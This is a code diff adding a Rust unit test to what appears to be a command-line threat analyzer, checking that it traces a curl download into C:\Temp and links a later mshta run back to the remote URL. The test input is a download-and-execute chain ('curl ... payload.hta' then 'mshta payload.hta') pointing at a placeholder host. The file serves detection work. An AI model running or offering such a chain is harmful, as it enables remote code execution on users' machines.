@@ -7769,6 +7769,41 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_remote_name_with_output_dir_tracks_joined_destination_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl --output-dir C:\Temp -O https://curl-output-dir-mshta.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_dst = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-output-dir-mshta.example/payload.hta"
+                        && dst == r#"C:\Temp\payload.hta"#
+            )
+        });
+        assert!(
+            has_download_dst,
+            "curl output-dir remote-name did not record joined destination: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://curl-output-dir-mshta.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta local HTA did not resolve curl output-dir download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_without_output_records_src_only() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl http://x/y", &mut env);
